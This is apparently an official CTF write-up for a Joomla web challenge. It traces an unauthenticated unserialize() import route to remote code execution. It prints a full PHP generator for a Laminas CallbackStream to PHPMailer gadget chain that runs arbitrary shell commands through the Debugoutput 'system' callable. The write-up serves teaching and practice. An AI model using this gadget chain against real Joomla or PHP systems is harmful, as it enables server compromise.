![img](../../assets/banner.png)

<img src='../../assets/htb.png' style='zoom: 80%;' align=left /> <font size='10'>Provisioned</font>

24<sup>th</sup> July 2026

Prepared By: `lordrukie`

Challenge Author(s): `lordrukie`

Difficulty: <font color='green'>Easy</font>

Classification: Official

<br><br>

# Synopsis

Provisioned is an Easy Web challenge that uses a custom Joomla system plugin for a public supply board and a hidden ledger import workflow. The import handler accepts attacker-controlled serialized PHP data, which can be shaped into an object graph that reaches a magic-method trigger and then a PHPMailer debug-output gadget for remote code execution.

# Description

The Provision Office claims every ward received full shares of bread, medicine, oil, coal, blankets, and water, yet kitchens are thinning soup, the South Infirmary is cutting doses, and shelters are burning furniture for heat. The ledgers look clean, but the streets tell a different story. Lysa Harrowmere must break into the guarded dispatch side, recover the true month by ward ledger, and bring Aeron the proof needed to expose who is stealing from the city.

## Skills Required

- Understanding of HTTP requests and responses
- Basic PHP source code review
- Familiarity with PHP serialization and magic methods
- Awareness of Composer vendor dependencies

## Skills Learned

- Reviewing a Joomla system plugin from a released challenge archive
- Reaching a hidden plugin route through Joomla's request lifecycle
- Exploiting unsafe PHP deserialization through a nested record value
- Finding a `__toString()` trigger gadget in a vendor dependency
- Chaining a callable gadget into PHPMailer debug output for command execution

# Solution

## Initial Enumeration

Starting with opening the application, we can see the public Eastreach Provision Office page. The page looks like a supply-status board for city wards. It shows a "Ward supply updates" header, a rotating notice section, a ward map, and a monthly goods section.

There is not much we can do on the index page. The ward markers only change the visible ward details, and the month selector only changes which public goods table is displayed. Since the public interface does not expose an obvious input that can affect the server, let's analyze the source code.

The challenge archive contains a Docker setup and a custom Joomla plugin:

```text
challenge/
|-- Dockerfile
|-- docker-compose.yml
|-- plugin/
|   |-- gatehouse.xml
|   |-- services/provider.php
|   `-- src/
|       |-- Extension/Gatehouse.php
|       `-- Workflow/
|           |-- GatehouseRenderer.php
|           `-- GatehouseRepository.php
`-- readflag.c
```

Looking at the `Dockerfile`, it seems like this application uses Joomla 6.1.2 with a custom system plugin copied into the plugin directory:

```dockerfile
WORKDIR /var/www/html

RUN curl -fsSL "https://downloads.joomla.org/cms/joomla6/6-1-2/Joomla_6-1-2-Stable-Full_Package.zip?format=zip" \
        -o /tmp/joomla.zip && \
    rm -rf /var/www/html/* && \
    unzip -q /tmp/joomla.zip -d /var/www/html && \
    rm /tmp/joomla.zip && \
    chown -R www-data:www-data /var/www/html

COPY plugin/ /opt/extensions/plg_system_gatehouse
```

The same Dockerfile also installs a SUID helper called `/readflag`:

```dockerfile
COPY readflag.c /tmp/readflag.c
COPY flag.txt /root/flag.txt
RUN gcc /tmp/readflag.c -o /readflag && \
    chown root:root /readflag && chmod 4755 /readflag && \
    chown root:root /root/flag.txt && chmod 600 /root/flag.txt && chmod 700 /root
```

Opening `readflag.c`, we can see the intended post-exploitation target:

```c
#include <stdlib.h>

int main(void)
{
    system("/bin/cat /root/flag.txt");
    return 0;
}
```

The target is code execution as the web user, followed by running `/readflag`.

## Understanding The Plugin

Looking at `plugin/gatehouse.xml`, it seems like the application registers a Joomla system plugin named `gatehouse`:

```xml
<extension type="plugin" group="system" method="upgrade">
    <name>plg_system_gatehouse</name>
    <namespace path="src">Joomla\Plugin\System\Gatehouse</namespace>
    <files>
        <folder plugin="gatehouse">services</folder>
        <folder>src</folder>
        <folder>media</folder>
    </files>
</extension>
```

The important part is `group="system"`. System plugins run during Joomla's request lifecycle, so they can process requests before a normal component controller handles authorization or routing.

Next, `plugin/services/provider.php` tells Joomla how to instantiate the plugin:

```php
return new class () implements ServiceProviderInterface {
    public function register(Container $container): void
    {
        $container->set(
            PluginInterface::class,
            $container->lazy(Gatehouse::class, function (Container $container) {
                $plugin = new Gatehouse(
                    (array) PluginHelper::getPlugin('system', 'gatehouse')
                );

                $plugin->setApplication(Factory::getApplication());
                $plugin->setDispatcher($container->get(DispatcherInterface::class));

                return $plugin;
            })
        );
    }
};
```

The main file to analyze is `plugin/src/Extension/Gatehouse.php`.

The plugin subscribes to two events:

```php
final class Gatehouse extends CMSPlugin implements SubscriberInterface
{
    public static function getSubscribedEvents(): array
    {
        return [
            'onAfterInitialise' => 'onAfterInitialise',
            'onAfterRoute' => 'onAfterRoute',
        ];
    }
}
```

The `onAfterInitialise()` handler is responsible for the visible pages. It calls `screen()` to decide which screen to render:

```php
public function onAfterInitialise(AfterInitialiseEvent $event): void
{
    $app = $event->getApplication();
    $screen = $this->screen($app);

    if ($screen === '') {
        return;
    }

    $app->setHeader('Content-Type', 'text/html; charset=utf-8', true);

    $renderer = new GatehouseRenderer();

    if ($screen !== 'board' && $this->isGuest($app)) {
        echo $renderer->locked();

        $app->close();

        return;
    }

    echo $renderer->render($screen);

    $app->close();
}
```

This matches what we saw in the browser. Guests can view the public board, but the dispatch screens are guarded:

```php
if ($screen !== 'board' && $this->isGuest($app)) {
    echo $renderer->locked();
    $app->close();
    return;
}
```

The visible page does not expose the import feature, but the plugin has another event handler: `onAfterRoute()`.

```php
public function onAfterRoute(AfterRouteEvent $event): void
{
    $app = $event->getApplication();

    if (!$this->isAdminImportContext($app)) {
        return;
    }

    $ledger = $app->getInput()->getRaw('ledger', '');

    if (!is_string($ledger) || trim($ledger) === '') {
        return;
    }

    (new GatehouseRepository())->importMonthlyLedger($ledger);
}
```

This handler works to receive a `ledger` parameter and pass it into the repository import function. It does not render the normal public board. It only runs when `isAdminImportContext()` returns true:

```php
private function isAdminImportContext($app): bool
{
    if (!$app->isClient('administrator')) {
        return false;
    }

    $input = $app->getInput();

    return $input->getCmd('option') === 'com_provision'
        && $input->getCmd('view') === 'dispatch'
        && $input->getCmd('task') === 'ledger.import';
}
```

This gives us a hidden route:

```text
/administrator/index.php?option=com_provision&view=dispatch&task=ledger.import
```

This function checks the administrator application context, but it does not check whether the user is authenticated. A direct request to that administrator URL with a `ledger` POST parameter reaches the import code.

## Finding The Vulnerability

`GatehouseRepository::importMonthlyLedger()` handles the `ledger` value:

```php
public function importMonthlyLedger(string $ledger): array
{
    if (trim($ledger) === '') {
        return $this->result('rejected', 'FAILED', 'Update could not be processed.');
    }

    $data = @unserialize($ledger);

    if (!is_array($data)) {
        return $this->result('rejected', 'FAILED', 'Update could not be processed.');
    }

    return $this->importMonthlyRecords($data);
}
```

The vulnerable line is:

```php
$data = @unserialize($ledger);
```

The `ledger` parameter is attacker-controlled and is passed directly into PHP's `unserialize()`.

The result must be an array:

```php
if (!is_array($data)) {
    return $this->result('rejected', 'FAILED', 'Update could not be processed.');
}
```

A payload containing only an object is rejected, so the top-level serialized value must be an array.

The array is then passed into `importMonthlyRecords()` and eventually into `normalizeMonthlyGoods()`:

```php
private function normalizeMonthlyGoods(array $source): array
{
    $months = [];

    foreach ($source as $entry) {
        if (!is_array($entry)) {
            continue;
        }

        $label = $this->clean((string) ($entry['month'] ?? $entry['label'] ?? ''));

        if ($label === '') {
            continue;
        }

        $packages = $entry['packages'] ?? null;
        $items = [];

        if ($packages !== null) {
            $items = $this->itemsFromPackageCount(max(0, (int) $packages));
        }

        if ($items === []) {
            continue;
        }

        $months[] = [
            'slug' => $this->slugify($label),
            'label' => $label,
            'summary' => $this->clean((string) ($entry['summary'] ?? 'Received')) ?: 'Received',
            'items' => $items,
        ];
    }

    return $months;
}
```

The most important line is:

```php
$label = $this->clean((string) ($entry['month'] ?? $entry['label'] ?? ''));
```

If `month` contains an object, PHP casts it to a string. If the class implements `__toString()`, that method is called.

The payload shape is:

```text
array
`-- record
    |-- month    -> object with a useful __toString()
    `-- packages -> normal integer so the record passes validation
```

The relevant path is:

```text
controlled ledger
-> unserialize()
-> array record is accepted
-> month is cast to string
-> __toString() is triggered
```

## Finding The Trigger Gadget

Next, search the Joomla vendor directory for `__toString()` methods:

```sh
rg -n "function __toString" libraries/vendor
```

One interesting match is `Laminas\Diactoros\CallbackStream`:

```php
class CallbackStream implements StreamInterface, Stringable
{
    /** @var callable|null */
    protected $callback;

    public function __construct(callable $callback)
    {
        $this->attach($callback);
    }

    public function __toString(): string
    {
        return $this->getContents();
    }

    public function detach(): ?callable
    {
        $callback       = $this->callback;
        $this->callback = null;
        return $callback;
    }

    public function getContents(): string
    {
        $callback = $this->detach();
        return $callback !== null ? (string) $callback() : '';
    }
}
```

This class stores a callback in a protected property. String conversion calls `getContents()`, which calls the stored callback:

```text
(string) CallbackStream
-> CallbackStream->__toString()
-> CallbackStream->getContents()
-> $callback()
```

Through deserialization, the protected `$callback` property can be set in the serialized object.

The callback needs a callable target with no required arguments.

## Finding The PHPMailer Gadget

`CallbackStream` calls the callback without arguments:

```php
$callback()
```

The target method should:

- take no required arguments
- be reachable from a loaded vendor class
- use object properties controlled through serialization
- reach command execution or another callback sink

Looking through Joomla's vendor dependencies, PHPMailer is available. The class `PHPMailer\PHPMailer\PHPMailer` has a public `send()` method with no required arguments:

```php
public function send()
{
    try {
        if (!$this->preSend()) {
            return false;
        }

        return $this->postSend();
    } catch (Exception $exc) {
        $this->mailHeader = '';
        $this->setError($exc->getMessage());
        if ($this->exceptions) {
            throw $exc;
        }

        return false;
    }
}
```

`send()` requires enough object state for `preSend()` to pass. At minimum, PHPMailer needs a recipient and a non-empty body:

```php
if (count($this->to) + count($this->cc) + count($this->bcc) < 1) {
    throw new Exception($this->lang('provide_address'), self::STOP_CRITICAL);
}

if (!$this->AllowEmpty && empty($this->Body)) {
    throw new Exception($this->lang('empty_message'), self::STOP_CRITICAL);
}
```

Serialized properties can provide the required recipient arrays and message body.

After `preSend()` succeeds, `postSend()` chooses a transport based on the `$Mailer` property:

```php
public function postSend()
{
    try {
        switch ($this->Mailer) {
            case 'sendmail':
            case 'qmail':
                return $this->sendmailSend($this->MIMEHeader, $this->MIMEBody);
            case 'smtp':
                return $this->smtpSend($this->MIMEHeader, $this->MIMEBody);
            case 'mail':
                return $this->mailSend($this->MIMEHeader, $this->MIMEBody);
            default:
                $sendMethod = $this->Mailer . 'Send';
                if (method_exists($this, $sendMethod)) {
                    return $this->{$sendMethod}($this->MIMEHeader, $this->MIMEBody);
                }

                return $this->mailSend($this->MIMEHeader, $this->MIMEBody);
        }
    } catch (Exception $exc) {
        $this->setError($exc->getMessage());
        $this->edebug($exc->getMessage());
        if ($this->exceptions) {
            throw $exc;
        }
    }

    return false;
}
```

The `sendmail` transport produces debug messages containing the `$Sendmail` property:

```php
protected function sendmailSend($header, $body)
{
    if ($this->Mailer === 'qmail') {
        $this->edebug('Sending with qmail');
    } else {
        $this->edebug('Sending with sendmail');
    }

    if (!empty($this->Sender) && static::validateAddress($this->Sender) && self::isShellSafe($this->Sender)) {
        if ($this->Mailer === 'qmail') {
            $sendmailFmt = '%s -f%s';
        } else {
            $sendmailFmt = '%s -oi -f%s -t';
        }
    } else {
        $sendmailFmt = '%s -oi -t';
    }

    $sendmail = sprintf($sendmailFmt, escapeshellcmd($this->Sendmail), $this->Sender);
    $this->edebug('Sendmail path: ' . $this->Sendmail);
    $this->edebug('Sendmail command: ' . $sendmail);
    $this->edebug('Envelope sender: ' . $this->Sender);

    $mail = @popen($sendmail, 'w');
}
```

The `popen()` call is not the useful sink here because PHPMailer applies `escapeshellcmd()` before building the command.

The useful sink is the debug output path. The `edebug()` function can call an attacker-controlled callable:

```php
protected function edebug($str)
{
    if ($this->SMTPDebug <= 0) {
        return;
    }

    if (is_callable($this->Debugoutput) && !in_array($this->Debugoutput, ['error_log', 'html', 'echo'])) {
        call_user_func($this->Debugoutput, $str, $this->SMTPDebug);

        return;
    }
}
```

Set these properties:

```php
$mailer->SMTPDebug = 4;
$mailer->Debugoutput = 'system';
$mailer->Mailer = 'sendmail';
$mailer->Sendmail = "\n/readflag\n";
```

This reaches:

```php
call_user_func('system', "Sendmail path: \n/readflag\n", 4);
```

The debug string contains `/readflag` on its own line, so the command is executed and the flag is printed.

The complete gadget chain is:

```text
Gatehouse::onAfterRoute()
-> GatehouseRepository::importMonthlyLedger()
-> unserialize($ledger)
-> GatehouseRepository::normalizeMonthlyGoods()
-> (string) $entry['month']
-> Laminas\Diactoros\CallbackStream->__toString()
-> Laminas\Diactoros\CallbackStream->getContents()
-> PHPMailer\PHPMailer\PHPMailer->send()
-> PHPMailer->postSend()
-> PHPMailer->sendmailSend()
-> PHPMailer->edebug('Sendmail path: ' . $this->Sendmail)
-> call_user_func('system', $debugMessage, 4)
-> /readflag
```

## Building The Serialized Payload

Build a serialized object graph that matches the chain.

The top-level value must be an array. Inside it, one ledger record must contain a `month` field that points to a `Laminas\Diactoros\CallbackStream` object. The callback inside that stream must point to `[PHPMailer object, 'send']`.

The PHPMailer object needs enough internal state for `send()` to reach `sendmailSend()`:

- `Mailer` must be `sendmail`
- `SMTPDebug` must be greater than `0`
- `Debugoutput` must be `system`
- `Sendmail` must contain a newline followed by `/readflag`
- `Body` must be non-empty
- the protected recipient arrays must contain at least one recipient

Use a local PHP generator with stub classes that have the same fully qualified class names and property visibility. This avoids manually writing protected-property null-byte markers:

```php
<?php

namespace PHPMailer\PHPMailer {
    class PHPMailer
    {
        public $Mailer = 'sendmail';
        public $Sendmail;
        public $UseSendmailOptions = true;
        public $From = 'attacker@example.com';
        public $FromName = 'Attacker';
        public $Sender = '';
        public $Subject = 'x';
        public $Body = 'x';
        public $AltBody = '';
        public $CharSet = 'iso-8859-1';
        public $ContentType = 'text/plain';
        public $Encoding = '8bit';
        public $SMTPDebug = 4;
        public $Debugoutput = 'system';

        protected $to = [
            [
                0 => 'victim@example.com',
                1 => 'Victim',
            ],
        ];
        protected $cc = [];
        protected $bcc = [];
        protected $ReplyTo = [];
        protected $all_recipients = [
            'victim@example.com' => true,
        ];
        protected $RecipientsQueue = [];
        protected $ReplyToQueue = [];
        protected $exceptions = false;
        protected $attachment = [];
        protected $CustomHeader = [];
        protected $MIMEHeader = '';
        protected $MIMEBody = '';
        protected $mailHeader = '';

        public function __construct()
        {
            $cmd = getenv('CMD') ?: '/readflag';
            $this->Sendmail = "\n{$cmd}\n";
        }
    }
}

namespace Laminas\Diactoros {
    class CallbackStream
    {
        protected $callback;

        public function __construct($callback)
        {
            $this->callback = $callback;
        }
    }
}

namespace {
    $mailer = new PHPMailer\PHPMailer\PHPMailer();
    $stream = new Laminas\Diactoros\CallbackStream([$mailer, 'send']);

    echo serialize([
        [
            'month' => $stream,
            'packages' => 1,
        ],
    ]);
}
```

Using this serialized data, we can obtain command execution on the server and retrieve flag.